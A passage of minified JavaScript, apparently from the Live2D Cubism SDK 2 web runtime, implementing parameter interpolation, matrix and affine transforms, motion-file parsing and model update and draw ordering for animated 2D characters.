H=o[h[0]],W=o[h[1]],j=o[h[2]],q=o[h[3]],J=o[h[4]],Q=o[h[5]],Z=o[h[6]],K=o[h[7]],tt=o[h[8]],it=o[h[9]],et=o[h[10]],rt=o[h[11]],ot=o[h[12]],nt=o[h[13]],st=o[h[14]],_t=o[h[15]],g=l[0],P=l[1],C=l[2],at=l[3],y=1-g,S=1-P,N=1-C,ht=1-at,lt=ht*N*S*y,$t=ht*N*S*g,ut=ht*N*P*y,pt=ht*N*P*g,ft=ht*C*S*y,ct=ht*C*S*g,dt=ht*C*P*y,gt=ht*C*P*g,yt=at*N*S*y,mt=at*N*S*g,Tt=at*N*P*y,Pt=at*N*P*g,St=at*C*S*y,vt=at*C*S*g,Lt=at*C*P*y,Mt=at*C*P*g,c=0;c<$;)n[u]=lt*H[c]+$t*W[c]+ut*j[c]+pt*q[c]+ft*J[c]+ct*Q[c]+dt*Z[c]+gt*K[c]+yt*tt[c]+mt*it[c]+Tt*et[c]+Pt*rt[c]+St*ot[c]+vt*nt[c]+Lt*st[c]+Mt*_t[c],++c,n[u+1]=lt*H[c]+$t*W[c]+ut*j[c]+pt*q[c]+ft*J[c]+ct*Q[c]+dt*Z[c]+gt*K[c]+yt*tt[c]+mt*it[c]+Tt*et[c]+Pt*rt[c]+St*ot[c]+vt*nt[c]+Lt*st[c]+Mt*_t[c],++c,u+=_;else{for(var Et=1<<a,At=new Float32Array(Et),It=0;It<Et;It++){for(var wt=It,xt=1,Ot=0;Ot<a;Ot++)xt*=wt%2==0?1-l[Ot]:l[Ot],wt/=2;At[It]=xt}for(var Dt=new Float32Array(Et),Rt=0;Rt<Et;Rt++)Dt[Rt]=o[h[Rt]];for(var c=0;c<$;){for(var bt=0,Ft=0,Ct=c+1,Rt=0;Rt<Et;Rt++)bt+=At[Rt]*Dt[Rt][c],Ft+=At[Rt]*Dt[Rt][Ct];c+=2,n[u]=bt,n[u+1]=Ft,u+=_}}},L.prototype._$HT=function(t,i){this.x=t,this.y=i},L.prototype._$HT=function(t){this.x=t.x,this.y=t.y},M._$ur=-2,M._$ES=500,M._$wb=2,M._$8S=3,M._$52=M._$ES,M._$R2=M._$ES,M._$or=function(){return M._$52},M._$Pr=function(){return M._$R2},M.prototype.convertClipIDForV2_11=function(t){var i=[];return null==t?null:0==t.length?null:/,/.test(t)?i=t.id.split(\",\"):(i.push(t.id),i)},M.prototype._$F0=function(t){this._$gP=t._$nP(),this._$dr=t._$nP(),this._$GS=t._$nP(),this._$qb=t._$6L(),this._$Lb=t._$cS(),this._$mS=t._$Tb(),t.getFormatVersion()>=G._$T7?(this.clipID=t._$nP(),this.clipIDList=this.convertClipIDForV2_11(this.clipID)):this.clipIDList=[],this._$MS(this._$Lb)},M.prototype.getClipIDList=function(){return this.clipIDList},M.prototype.init=function(t){},M.prototype._$Nr=function(t,i){if(i._$IS[0]=!1,i._$Us=v._$Z2(t,this._$GS,i._$IS,this._$Lb),at._$Zs);else if(i._$IS[0])return;i._$7s=v._$br(t,this._$GS,i._$IS,this._$mS)},M.prototype._$2b=function(t,i){},M.prototype.getDrawDataID=function(){return this._$gP},M.prototype._$j2=function(t){this._$gP=t},M.prototype.getOpacity=function(t,i){return i._$7s},M.prototype._$zS=function(t,i){return i._$Us},M.prototype._$MS=function(t){for(var i=t.length-1;i>=0;--i){var e=t[i];e<M._$52?M._$52=e:e>M._$R2&&(M._$R2=e)}},M.prototype.getTargetBaseDataID=function(){return this._$dr},M.prototype._$gs=function(t){this._$dr=t},M.prototype._$32=function(){return null!=this._$dr&&this._$dr!=yt._$2o()},M.prototype.preDraw=function(t,i,e){},M.prototype.draw=function(t,i,e){},M.prototype.getType=function(){},M.prototype._$B2=function(t,i,e){},E._$ps=32,E.CLIPPING_PROCESS_NONE=0,E.CLIPPING_PROCESS_OVERWRITE_ALPHA=1,E.CLIPPING_PROCESS_MULTIPLY_ALPHA=2,E.CLIPPING_PROCESS_DRAW=3,E.CLIPPING_PROCESS_CLEAR_ALPHA=4,E.prototype.setChannelFlagAsColor=function(t,i){this.CHANNEL_COLORS[t]=i},E.prototype.getChannelFlagAsColor=function(t){return this.CHANNEL_COLORS[t]},E.prototype._$ZT=function(){},E.prototype._$Uo=function(t,i,e,r,o,n,s){},E.prototype._$Rs=function(){return-1},E.prototype._$Ds=function(t){},E.prototype.setBaseColor=function(t,i,e,r){t<0?t=0:t>1&&(t=1),i<0?i=0:i>1&&(i=1),e<0?e=0:e>1&&(e=1),r<0?r=0:r>1&&(r=1),this._$lT=t,this._$C0=i,this._$tT=e,this._$WL=r},E.prototype._$WP=function(t){this.culling=t},E.prototype.setMatrix=function(t){for(var i=0;i<16;i++)this.matrix4x4[i]=t[i]},E.prototype._$IT=function(){return this.matrix4x4},E.prototype.setPremultipliedAlpha=function(t){this.premultipliedAlpha=t},E.prototype.isPremultipliedAlpha=function(){return this.premultipliedAlpha},E.prototype.setAnisotropy=function(t){this.anisotropy=t},E.prototype.getAnisotropy=function(){return this.anisotropy},E.prototype.getClippingProcess=function(){return this.clippingProcess},E.prototype.setClippingProcess=function(t){this.clippingProcess=t},E.prototype.setClipBufPre_clipContextForMask=function(t){this.clipBufPre_clipContextMask=t},E.prototype.getClipBufPre_clipContextMask=function(){return this.clipBufPre_clipContextMask},E.prototype.setClipBufPre_clipContextForDraw=function(t){this.clipBufPre_clipContextDraw=t},E.prototype.getClipBufPre_clipContextDraw=function(){return this.clipBufPre_clipContextDraw},I._$ur=-2,I._$c2=1,I._$_b=2,I.prototype._$F0=function(t){this._$kP=t._$nP(),this._$dr=t._$nP()},I.prototype.readV2_opacity=function(t){t.getFormatVersion()>=G.LIVE2D_FORMAT_VERSION_V2_10_SDK2&&(this._$mS=t._$Tb())},I.prototype.init=function(t){},I.prototype._$Nr=function(t,i){},I.prototype.interpolateOpacity=function(t,i,e,r){null==this._$mS?e.setInterpolatedOpacity(1):e.setInterpolatedOpacity(v._$br(t,i,r,this._$mS))},I.prototype._$2b=function(t,i){},I.prototype._$nb=function(t,i,e,r,o,n,s){},I.prototype.getType=function(){},I.prototype._$gs=function(t){this._$dr=t},I.prototype._$a2=function(t){this._$kP=t},I.prototype.getTargetBaseDataID=function(){return this._$dr},I.prototype.getBaseDataID=function(){return this._$kP},I.prototype._$32=function(){return null!=this._$dr&&this._$dr!=yt._$2o()},w._$W2=0,w._$CS=w._$W2,w._$Mo=function(){return!0},w._$XP=function(t){try{for(var i=getTimeMSec();getTimeMSec()-i<t;);}catch(t){t._$Rb()}},w.getUserTimeMSec=function(){return w._$CS==w._$W2?w.getSystemTimeMSec():w._$CS},w.setUserTimeMSec=function(t){w._$CS=t},w.updateUserTimeMSec=function(){return w._$CS=w.getSystemTimeMSec()},w.getTimeMSec=function(){return(new Date).getTime()},w.getSystemTimeMSec=function(){return(new Date).getTime()},w._$Q=function(t){},w._$jT=function(t,i,e,r,o){for(var n=0;n<o;n++)e[r+n]=t[i+n]},x._$ds=-2,x.prototype._$F0=function(t){this._$wL=t._$nP(),this._$VP=t._$6L(),this._$GP=t._$nP()},x.prototype.getParamIndex=function(t){return this._$2r!=t&&(this._$8o=x._$ds),this._$8o},x.prototype._$Pb=function(t,i){this._$8o=t,this._$2r=i},x.prototype.getParamID=function(){return this._$wL},x.prototype._$yP=function(t){this._$wL=t},x.prototype._$N2=function(){return this._$VP},x.prototype._$d2=function(){return this._$GP},x.prototype._$t2=function(t,i){this._$VP=t,this._$GP=i},x.prototype._$Lr=function(){return this._$O2},x.prototype._$wr=function(t){this._$O2=t},x.prototype._$SL=function(){return this._$ri},x.prototype._$AL=function(t){this._$ri=t},O.startsWith=function(t,i,e){var r=i+e.length;if(r>=t.length)return!1;for(var o=i;o<r;o++)if(O.getChar(t,o)!=e.charAt(o-i))return!1;return!0},O.getChar=function(t,i){return String.fromCharCode(t.getUint8(i))},O.createString=function(t,i,e){for(var r=new ArrayBuffer(2*e),o=new Uint16Array(r),n=0;n<e;n++)o[n]=t.getUint8(i+n);return String.fromCharCode.apply(null,o)},O._$LS=function(t,i,e,r){t instanceof ArrayBuffer&&(t=new DataView(t));var o=e,n=!1,s=!1,_=0,a=O.getChar(t,o);\"-\"==a&&(n=!0,o++);for(var h=!1;o<i;o++){switch(a=O.getChar(t,o)){case\"0\":_*=10;break;case\"1\":_=10*_+1;break;case\"2\":_=10*_+2;break;case\"3\":_=10*_+3;break;case\"4\":_=10*_+4;break;case\"5\":_=10*_+5;break;case\"6\":_=10*_+6;break;case\"7\":_=10*_+7;break;case\"8\":_=10*_+8;break;case\"9\":_=10*_+9;break;case\".\":s=!0,o++,h=!0;break;default:h=!0}if(h)break}if(s)for(var l=.1,$=!1;o<i;o++){switch(a=O.getChar(t,o)){case\"0\":break;case\"1\":_+=1*l;break;case\"2\":_+=2*l;break;case\"3\":_+=3*l;break;case\"4\":_+=4*l;break;case\"5\":_+=5*l;break;case\"6\":_+=6*l;break;case\"7\":_+=7*l;break;case\"8\":_+=8*l;break;case\"9\":_+=9*l;break;default:$=!0}if(l*=.1,$)break}return n&&(_=-_),r[0]=o,_},D.prototype._$zP=function(){this._$Ob=new Array},D.prototype._$F0=function(t){this._$Ob=t._$nP()},D.prototype._$Ur=function(t){if(t._$WS())return!0;for(var i=t._$v2(),e=this._$Ob.length-1;e>=0;--e){var r=this._$Ob[e].getParamIndex(i);if(r==x._$ds&&(r=t.getParamIndex(this._$Ob[e].getParamID())),t._$Xb(r))return!0}return!1},D.prototype._$Q2=function(t,i){for(var e,r,o=this._$Ob.length,n=t._$v2(),s=0,_=0;_<o;_++){var a=this._$Ob[_];if(e=a.getParamIndex(n),e==x._$ds&&(e=t.getParamIndex(a.getParamID()),a._$Pb(e,n)),e<0)throw new Exception(\"err 23242 : \"+a.getParamID());var h=e<0?0:t.getParamFloat(e);r=a._$N2();var l,$,u=a._$d2(),p=-1,f=0;if(r<1);else if(1==r)l=u[0],l-U._$J<h&&h<l+U._$J?(p=0,f=0):(p=0,i[0]=!0);else if(l=u[0],h<l-U._$J)p=0,i[0]=!0;else if(h<l+U._$J)p=0;else{for(var c=!1,d=1;d<r;++d){if($=u[d],h<$+U._$J){$-U._$J<h?p=d:(p=d-1,f=(h-l)/($-l),s++),c=!0;break}l=$}c||(p=r-1,f=0,i[0]=!0)}a._$wr(p),a._$AL(f)}return s},D.prototype._$zr=function(t,i,e){var r=1<<e;r+1>U._$Qb&&console.log(\"err 23245\\n\");for(var o=this._$Ob.length,n=1,s=1,_=0,a=0;a<r;++a)t[a]=0;for(var h=0;h<o;++h){var l=this._$Ob[h];if(0==l._$SL()){var $=l._$Lr()*n;if($<0&&at._$3T)throw new Exception(\"err 23246\");for(var a=0;a<r;++a)t[a]+=$}else{for(var $=n*l._$Lr(),u=n*(l._$Lr()+1),a=0;a<r;++a)t[a]+=(a/s|0)%2==0?$:u;i[_++]=l._$SL(),s*=2}n*=l._$N2()}t[r]=65535,i[_]=-1},D.prototype._$h2=function(t,i,e){for(var r=new Float32Array(i),o=0;o<i;++o)r[o]=e[o];var n=new x;n._$yP(t),n._$t2(i,r),this._$Ob.push(n)},D.prototype._$J2=function(t){for(var i=t,e=this._$Ob.length,r=0;r<e;++r){var o=this._$Ob[r],n=o._$N2(),s=i%o._$N2(),_=o._$d2()[s];console.log(\"%s[%d]=%7.2f / \",o.getParamID(),s,_),i/=n}console.log(\"\\n\")},D.prototype.getParamCount=function(){return this._$Ob.length},D.prototype._$zs=function(){return this._$Ob},R.prototype.identity=function(){for(var t=0;t<16;t++)this.m[t]=t%5==0?1:0},R.prototype.getArray=function(){return this.m},R.prototype.getCopyMatrix=function(){return new Float32Array(this.m)},R.prototype.setMatrix=function(t){if(null!=t&&16==t.length)for(var i=0;i<16;i++)this.m[i]=t[i]},R.prototype.mult=function(t,i,e){return null==i?null:(this==i?this.mult_safe(this.m,t.m,i.m,e):this.mult_fast(this.m,t.m,i.m,e),i)},R.prototype.mult_safe=function(t,i,e,r){if(t==e){var o=new Array(16);this.mult_fast(t,i,o,r);for(var n=15;n>=0;--n)e[n]=o[n]}else this.mult_fast(t,i,e,r)},R.prototype.mult_fast=function(t,i,e,r){r?(e[0]=t[0]*i[0]+t[4]*i[1]+t[8]*i[2],e[4]=t[0]*i[4]+t[4]*i[5]+t[8]*i[6],e[8]=t[0]*i[8]+t[4]*i[9]+t[8]*i[10],e[12]=t[0]*i[12]+t[4]*i[13]+t[8]*i[14]+t[12],e[1]=t[1]*i[0]+t[5]*i[1]+t[9]*i[2],e[5]=t[1]*i[4]+t[5]*i[5]+t[9]*i[6],e[9]=t[1]*i[8]+t[5]*i[9]+t[9]*i[10],e[13]=t[1]*i[12]+t[5]*i[13]+t[9]*i[14]+t[13],e[2]=t[2]*i[0]+t[6]*i[1]+t[10]*i[2],e[6]=t[2]*i[4]+t[6]*i[5]+t[10]*i[6],e[10]=t[2]*i[8]+t[6]*i[9]+t[10]*i[10],e[14]=t[2]*i[12]+t[6]*i[13]+t[10]*i[14]+t[14],e[3]=e[7]=e[11]=0,e[15]=1):(e[0]=t[0]*i[0]+t[4]*i[1]+t[8]*i[2]+t[12]*i[3],e[4]=t[0]*i[4]+t[4]*i[5]+t[8]*i[6]+t[12]*i[7],e[8]=t[0]*i[8]+t[4]*i[9]+t[8]*i[10]+t[12]*i[11],e[12]=t[0]*i[12]+t[4]*i[13]+t[8]*i[14]+t[12]*i[15],e[1]=t[1]*i[0]+t[5]*i[1]+t[9]*i[2]+t[13]*i[3],e[5]=t[1]*i[4]+t[5]*i[5]+t[9]*i[6]+t[13]*i[7],e[9]=t[1]*i[8]+t[5]*i[9]+t[9]*i[10]+t[13]*i[11],e[13]=t[1]*i[12]+t[5]*i[13]+t[9]*i[14]+t[13]*i[15],e[2]=t[2]*i[0]+t[6]*i[1]+t[10]*i[2]+t[14]*i[3],e[6]=t[2]*i[4]+t[6]*i[5]+t[10]*i[6]+t[14]*i[7],e[10]=t[2]*i[8]+t[6]*i[9]+t[10]*i[10]+t[14]*i[11],e[14]=t[2]*i[12]+t[6]*i[13]+t[10]*i[14]+t[14]*i[15],e[3]=t[3]*i[0]+t[7]*i[1]+t[11]*i[2]+t[15]*i[3],e[7]=t[3]*i[4]+t[7]*i[5]+t[11]*i[6]+t[15]*i[7],e[11]=t[3]*i[8]+t[7]*i[9]+t[11]*i[10]+t[15]*i[11],e[15]=t[3]*i[12]+t[7]*i[13]+t[11]*i[14]+t[15]*i[15])},R.prototype.translate=function(t,i,e){this.m[12]=this.m[0]*t+this.m[4]*i+this.m[8]*e+this.m[12],this.m[13]=this.m[1]*t+this.m[5]*i+this.m[9]*e+this.m[13],this.m[14]=this.m[2]*t+this.m[6]*i+this.m[10]*e+this.m[14],this.m[15]=this.m[3]*t+this.m[7]*i+this.m[11]*e+this.m[15]},R.prototype.scale=function(t,i,e){this.m[0]*=t,this.m[4]*=i,this.m[8]*=e,this.m[1]*=t,this.m[5]*=i,this.m[9]*=e,this.m[2]*=t,this.m[6]*=i,this.m[10]*=e,this.m[3]*=t,this.m[7]*=i,this.m[11]*=e},R.prototype.rotateX=function(t){var i=Lt.fcos(t),e=Lt._$9(t),r=this.m[4];this.m[4]=r*i+this.m[8]*e,this.m[8]=r*-e+this.m[8]*i,r=this.m[5],this.m[5]=r*i+this.m[9]*e,this.m[9]=r*-e+this.m[9]*i,r=this.m[6],this.m[6]=r*i+this.m[10]*e,this.m[10]=r*-e+this.m[10]*i,r=this.m[7],this.m[7]=r*i+this.m[11]*e,this.m[11]=r*-e+this.m[11]*i},R.prototype.rotateY=function(t){var i=Lt.fcos(t),e=Lt._$9(t),r=this.m[0];this.m[0]=r*i+this.m[8]*-e,this.m[8]=r*e+this.m[8]*i,r=this.m[1],this.m[1]=r*i+this.m[9]*-e,this.m[9]=r*e+this.m[9]*i,r=m[2],this.m[2]=r*i+this.m[10]*-e,this.m[10]=r*e+this.m[10]*i,r=m[3],this.m[3]=r*i+this.m[11]*-e,this.m[11]=r*e+this.m[11]*i},R.prototype.rotateZ=function(t){var i=Lt.fcos(t),e=Lt._$9(t),r=this.m[0];this.m[0]=r*i+this.m[4]*e,this.m[4]=r*-e+this.m[4]*i,r=this.m[1],this.m[1]=r*i+this.m[5]*e,this.m[5]=r*-e+this.m[5]*i,r=this.m[2],this.m[2]=r*i+this.m[6]*e,this.m[6]=r*-e+this.m[6]*i,r=this.m[3],this.m[3]=r*i+this.m[7]*e,this.m[7]=r*-e+this.m[7]*i},b.prototype=new et,b._$tP=new Object,b._$27=function(){b._$tP.clear()},b.getID=function(t){var i=b._$tP[t];return null==i&&(i=new b(t),b._$tP[t]=i),i},b.prototype._$3s=function(){return new b},F._$kS=-1,F._$pS=0,F._$hb=1,F.STATE_IDENTITY=0,F._$gb=1,F._$fo=2,F._$go=4,F.prototype.transform=function(t,i,e){var r,o,n,s,_,a,h=0,l=0;switch(this._$hi){default:return;case F._$go|F._$fo|F._$gb:for(r=this._$7,o=this._$H,n=this._$k,s=this._$f,_=this._$g,a=this._$w;--e>=0;){var $=t[h++],u=t[h++];i[l++]=r*$+o*u+n,i[l++]=s*$+_*u+a}return;case F._$go|F._$fo:for(r=this._$7,o=this._$H,s=this._$f,_=this._$g;--e>=0;){var $=t[h++],u=t[h++];i[l++]=r*$+o*u,i[l++]=s*$+_*u}return;case F._$go|F._$gb:for(o=this._$H,n=this._$k,s=this._$f,a=this._$w;--e>=0;){var $=t[h++];i[l++]=o*t[h++]+n,i[l++]=s*$+a}return;case F._$go:for(o=this._$H,s=this._$f;--e>=0;){var $=t[h++];i[l++]=o*t[h++],i[l++]=s*$}return;case F._$fo|F._$gb:for(r=this._$7,n=this._$k,_=this._$g,a=this._$w;--e>=0;)i[l++]=r*t[h++]+n,i[l++]=_*t[h++]+a;return;case F._$fo:for(r=this._$7,_=this._$g;--e>=0;)i[l++]=r*t[h++],i[l++]=_*t[h++];return;case F._$gb:for(n=this._$k,a=this._$w;--e>=0;)i[l++]=t[h++]+n,i[l++]=t[h++]+a;return;case F.STATE_IDENTITY:return void(t==i&&h==l||w._$jT(t,h,i,l,2*e))}},F.prototype.update=function(){0==this._$H&&0==this._$f?1==this._$7&&1==this._$g?0==this._$k&&0==this._$w?(this._$hi=F.STATE_IDENTITY,this._$Z=F._$pS):(this._$hi=F._$gb,this._$Z=F._$hb):0==this._$k&&0==this._$w?(this._$hi=F._$fo,this._$Z=F._$kS):(this._$hi=F._$fo|F._$gb,this._$Z=F._$kS):0==this._$7&&0==this._$g?0==this._$k&&0==this._$w?(this._$hi=F._$go,this._$Z=F._$kS):(this._$hi=F._$go|F._$gb,this._$Z=F._$kS):0==this._$k&&0==this._$w?(this._$hi=F._$go|F._$fo,this._$Z=F._$kS):(this._$hi=F._$go|F._$fo|F._$gb,this._$Z=F._$kS)},F.prototype._$RT=function(t){this._$IT(t);var i=t[0],e=t[2],r=t[1],o=t[3],n=Math.sqrt(i*i+r*r),s=i*o-e*r;0==n?at._$so&&console.log(\"affine._$RT() / rt==0\"):(t[0]=n,t[1]=s/n,t[2]=(r*o+i*e)/s,t[3]=Math.atan2(r,i))},F.prototype._$ho=function(t,i,e,r){var o=new Float32Array(6),n=new Float32Array(6);t._$RT(o),i._$RT(n);var s=new Float32Array(6);s[0]=o[0]+(n[0]-o[0])*e,s[1]=o[1]+(n[1]-o[1])*e,s[2]=o[2]+(n[2]-o[2])*e,s[3]=o[3]+(n[3]-o[3])*e,s[4]=o[4]+(n[4]-o[4])*e,s[5]=o[5]+(n[5]-o[5])*e,r._$CT(s)},F.prototype._$CT=function(t){var i=Math.cos(t[3]),e=Math.sin(t[3]);this._$7=t[0]*i,this._$f=t[0]*e,this._$H=t[1]*(t[2]*i-e),this._$g=t[1]*(t[2]*e+i),this._$k=t[4],this._$w=t[5],this.update()},F.prototype._$IT=function(t){t[0]=this._$7,t[1]=this._$f,t[2]=this._$H,t[3]=this._$g,t[4]=this._$k,t[5]=this._$w},C.prototype=new s,C._$cs=\"VISIBLE:\",C._$ar=\"LAYOUT:\",C._$Co=0,C._$D2=[],C._$1T=1,C.loadMotion=function(t){var i=new C,e=[0],r=t.length;i._$yT=0;for(var o=0;o<r;++o){var n=255&t[o];if(\"\\n\"!=n&&\"\\r\"!=n)if(\"#\"!=n)if(\"$\"!=n){if(\"a\"<=n&&n<=\"z\"||\"A\"<=n&&n<=\"Z\"||\"_\"==n){for(var s=o,_=-1;o<r&&(\"\\r\"!=(n=255&t[o])&&\"\\n\"!=n);++o)if(\"=\"==n){_=o;break}if(_>=0){var a=new B;O.startsWith(t,s,C._$cs)?(a._$RP=B._$hs,a._$4P=new String(t,s,_-s)):O.startsWith(t,s,C._$ar)?(a._$4P=new String(t,s+7,_-s-7),O.startsWith(t,s+7,\"ANCHOR_X\")?a._$RP=B._$xs:O.startsWith(t,s+7,\"ANCHOR_Y\")?a._$RP=B._$us:O.startsWith(t,s+7,\"SCALE_X\")?a._$RP=B._$qs:O.startsWith(t,s+7,\"SCALE_Y\")?a._$RP=B._$Ys:O.startsWith(t,s+7,\"X\")?a._$RP=B._$ws:O.startsWith(t,s+7,\"Y\")&&(a._$RP=B._$Ns)):(a._$RP=B._$Fr,a._$4P=new String(t,s,_-s)),i.motions.push(a);var h=0;for(C._$D2.clear(),o=_+1;o<r&&(\"\\r\"!=(n=255&t[o])&&\"\\n\"!=n);++o)if(\",\"!=n&&\" \"!=n&&\"\\t\"!=n){var l=O._$LS(t,r,o,e);if(e[0]>0){C._$D2.push(l),h++;var $=e[0];if($<o){console.log(\"_$n0 _$hi . @Live2DMotion loadMotion()\\n\");break}o=$}}a._$I0=C._$D2._$BL(),h>i._$yT&&(i._$yT=h)}}}else{for(var s=o,_=-1;o<r&&(\"\\r\"!=(n=255&t[o])&&\"\\n\"!=n);++o)if(\"=\"==n){_=o;break}var u=!1;if(_>=0)for(_==s+4&&\"f\"==t[s+1]&&\"p\"==t[s+2]&&\"s\"==t[s+3]&&(u=!0),o=_+1;o<r&&(\"\\r\"!=(n=255&t[o])&&\"\\n\"!=n);++o)if(\",\"!=n&&\" \"!=n&&\"\\t\"!=n){var l=O._$LS(t,r,o,e);e[0]>0&&u&&5<l&&l<121&&(i._$D0=l),o=e[0]}for(;o<r&&(\"\\n\"!=t[o]&&\"\\r\"!=t[o]);++o);}else for(;o<r&&(\"\\n\"!=t[o]&&\"\\r\"!=t[o]);++o);}return i._$AS=1e3*i._$yT/i._$D0|0,i},C.prototype.getDurationMSec=function(){return this._$AS},C.prototype.dump=function(){for(var t=0;t<this.motions.length;t++){var i=this.motions[t];console.log(\"_$wL[%s] [%d]. \",i._$4P,i._$I0.length);for(var e=0;e<i._$I0.length&&e<10;e++)console.log(\"%5.2f ,\",i._$I0[e]);console.log(\"\\n\")}},C.prototype.updateParamExe=function(t,i,e,r){for(var o=i-r._$z2,n=o*this._$D0/1e3,s=0|n,_=n-s,a=0;a<this.motions.length;a++){var h=this.motions[a],l=h._$I0.length,$=h._$4P;if(h._$RP==B._$hs){var u=h._$I0[s>=l?l-1:s];t.setParamFloat($,u)}else if(B._$ws<=h._$RP&&h._$RP<=B._$Ys);else{var p=t.getParamFloat($),f=h._$I0[s>=l?l-1:s],c=h._$I0[s+1>=l?l-1:s+1],d=f+(c-f)*_,g=p+(d-p)*e;t.setParamFloat($,g)}}s>=this._$yT&&(this._$E?(r._$z2=i,this.loopFadeIn&&(r._$bs=i)):r._$9L=!0)},C.prototype._$r0=function(){return this._$E},C.prototype._$aL=function(t){this._$E=t},C.prototype.isLoopFadeIn=function(){return this.loopFadeIn},C.prototype.setLoopFadeIn=function(t){this.loopFadeIn=t},N.prototype.clear=function(){this.size=0},N.prototype.add=function(t){if(this._$P.length<=this.size){var i=new Float32Array(2*this.size);w._$jT(this._$P,0,i,0,this.size),this._$P=i}this._$P[this.size++]=t},N.prototype._$BL=function(){var t=new Float32Array(this.size);return w._$jT(this._$P,0,t,0,this.size),t},B._$Fr=0,B._$hs=1,B._$ws=100,B._$Ns=101,B._$xs=102,B._$us=103,B._$qs=104,B._$Ys=105,U._$Ms=1,U._$Qs=2,U._$i2=0,U._$No=2,U._$do=U._$Ms,U._$Ls=!0,U._$1r=5,U._$Qb=65,U._$J=1e-4,U._$FT=.001,U._$Ss=3,G._$o7=6,G._$S7=7,G._$s7=8,G._$77=9,G.LIVE2D_FORMAT_VERSION_V2_10_SDK2=10,G.LIVE2D_FORMAT_VERSION_V2_11_SDK2_1=11,G._$T7=G.LIVE2D_FORMAT_VERSION_V2_11_SDK2_1,G._$Is=-2004318072,G._$h0=0,G._$4L=23,G._$7P=33,G._$uT=function(t){console.log(\"_$bo :: _$6 _$mo _$E0 : %d\\n\",t)},G._$9o=function(t){if(t<40)return G._$uT(t),null;if(t<50)return G._$uT(t),null;if(t<60)return G._$uT(t),null;if(t<100)switch(t){case 65:return new Z;case 66:return new D;case 67:return new x;case 68:return new z;case 69:return new P;case 70:return new $t;default:return G._$uT(t),null}else if(t<150)switch(t){case 131:return new st;case 133:return new tt;case 136:return new p;case 137:return new ot;case 142:return new j}return G._$uT(t),null},Y._$HP=0,Y._$_0=!0;Y._$V2=-1,Y._$W0=-1,Y._$jr=!1,Y._$ZS=!0,Y._$tr=-1e6,Y._$lr=1e6,Y._$is=32,Y._$e=!1,Y.prototype.getDrawDataIndex=function(t){for(var i=this._$aS.length-1;i>=0;--i)if(null!=this._$aS[i]&&this._$aS[i].getDrawDataID()==t)return i;return-1},Y.prototype.getDrawData=function(t){if(t instanceof b){if(null==this._$Bo){this._$Bo=new Object;for(var i=this._$aS.length,e=0;e<i;e++){var r=this._$aS[e],o=r.getDrawDataID();null!=o&&(this._$Bo[o]=r)}}return this._$Bo[id]}return t<this._$aS.length?this._$aS[t]:null},Y.prototype.release=function(){this._$3S.clear(),this._$aS.clear(),this._$F2.clear(),null!=this._$Bo&&this._$Bo.clear(),this._$db.clear(),this._$8b.clear(),this._$Hr.clear()},Y.prototype.init=function(){this._$co++,this._$F2.length>0&&this.release();for(var t=this._$Ri.getModelImpl(),i=t._$Xr(),r=i.length,o=new Array,n=new Array,s=0;s<r;++s){var _=i[s];this._$F2.push(_),this._$Hr.push(_.init(this));for(var a=_.getBaseData(),h=a.length,l=0;l<h;++l)o.push(a[l]);for(var l=0;l<h;++l){var $=a[l].init(this);$._$l2(s),n.push($)}for(var u=_.getDrawData(),p=u.length,l=0;l<p;++l){var f=u[l],c=f.init(this);c._$IP=s,this._$aS.push(f),this._$8b.push(c)}}for(var d=o.length,g=yt._$2o();;){for(var y=!1,s=0;s<d;++s){var m=o[s];if(null!=m){var T=m.getTargetBaseDataID();(null==T||T==g||this.getBaseDataIndex(T)>=0)&&(this._$3S.push(m),this._$db.push(n[s]),o[s]=null,y=!0)}}if(!y)break}var P=t._$E2();if(null!=P){var S=P._$1s();if(null!=S)for(var v=S.length,s=0;s<v;++s){var L=S[s];null!=L&&this._$02(L.getParamID(),L.getDefaultValue(),L.getMinValue(),L.getMaxValue())}}this.clipManager=new e(this.dp_webgl),this.clipManager.init(this,this._$aS,this._$8b),this._$QT=!0},Y.prototype.update=function(){Y._$e&&_.start(\"_$zL\");for(var t=this._$_2.length,i=0;i<t;i++)this._$_2[i]!=this._$vr[i]&&(this._$Js[i]=Y._$ZS,this._$vr[i]=this._$_2[i]);var e=this._$3S.length,r=this._$aS.length,o=W._$or(),n=W._$Pr(),s=n-o+1;(null==this._$Ws||this._$Ws.length<s)&&(this._$Ws=new Int16Array(s),this._$Vs=new Int16Array(s));for(var i=0;i<s;i++)this._$Ws[i]=Y._$V2,this._$Vs[i]=Y._$V2;(null==this._$Er||this._$Er.length<r)&&(this._$Er=new Int16Array(r));for(var i=0;i<r;i++)this._$Er[i]=Y._$W0;Y._$e&&_.dump(\"_$zL\"),Y._$e&&_.start(\"_$UL\");for(var a=null,h=0;h<e;++h){var l=this._$3S[h],$=this._$db[h];try{l._$Nr(this,$),l._$2b(this,$)}catch(t){null==a&&(a=t)}}null!=a&&Y._$_0&&_._$Rb(a),Y._$e&&_.dump(\"_$UL\"),Y._$e&&_.start(\"_$DL\");for(var u=null,p=0;p<r;++p){var f=this._$aS[p],c=this._$8b[p];try{if(f._$Nr(this,c),c._$u2())continue;f._$2b(this,c);var d,g=Math.floor(f._$zS(this,c)-o);try{d=this._$Vs[g]}catch(t){console.log(\"_$li :: %s / %s \\t\\t\\t\\t@@_$fS\\n\",t.toString(),f.getDrawDataID().toString()),g=Math.floor(f._$zS(this,c)-o);continue}d==Y._$V2?this._$Ws[g]=p:this._$Er[d]=p,this._$Vs[g]=p}catch(t){null==u&&(u=t,at._$sT(at._$H7))}}null!=u&&Y._$_0&&_._$Rb(u),Y._$e&&_.dump(\"_$DL\"),Y._$e&&_.start(\"_$eL\");for(var i=this._$Js.length-1;i>=0;i--)this._$Js[i]=Y._$jr;return this._$QT=!1,Y._$e&&_.dump(\"_$eL\"),!1},Y.prototype.preDraw=function(t){null!=this.clipManager&&(t._$ZT(),this.clipManager.setupClip(this,t))},Y.prototype.draw=function(t){if(null==this._$Ws)return void _._$li(\"call _$Ri.update() before _$Ri.draw() \");var i=this._$Ws.length;t._$ZT();for(var e=0;e<i;++e){var r=this._$Ws[e];if(r!=Y._$V2)for(;;){var o=this._$aS[r],n=this._$8b[r];if(n._$yo()){var s=n._$IP,a=this._$Hr[s];n._$VS=a.getPartsOpacity(),o.draw(t,this,n)}var h=this._$Er[r];if(h<=r||h==Y._$W0)break;r=h}}},Y.prototype.getParamIndex=function(t){for(var i=this._$pb.length-1;i>=0;--i)if(this._$pb[i]==t)return i;return this._$02(t,0,Y._$tr,Y._$lr)},Y.prototype._$BS=function(t){return this.getBaseDataIndex(t)},Y.prototype.getBaseDataIndex=function(t){for(var 